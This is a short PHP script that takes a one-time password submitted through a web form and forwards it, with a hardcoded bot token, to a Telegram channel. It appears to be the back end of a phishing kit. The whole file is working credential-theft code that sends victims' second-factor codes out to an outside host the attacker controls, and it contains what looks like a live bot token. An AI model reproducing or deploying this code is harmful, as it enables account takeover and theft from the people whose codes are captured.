<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $otp = $_POST['otp'];

    $telegramToken = "7480485973:AAEc5xoO6_z6ZtSXAMxZB4iqih4M7peeyoM";
    $telegramChatId = "@onlysendlegs";

    $message = "New OTP submission:\n";
    $message .= "--------------------\n"; // Divider
    $message .= "OTP: " . htmlspecialchars($otp) . "\n";

    $telegramApiUrl = "https://api.telegram.org/bot$telegramToken/sendMessage";

    $data = [
        'chat_id' => $telegramChatId,
        'text' => $message
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($telegramApiUrl, false, $context);

    if ($result) {
        echo "Success: " . $result;
    } else {
        echo "Error: Unable to send message.";
    }
} else {
    echo "Invalid request method.";
}
?>
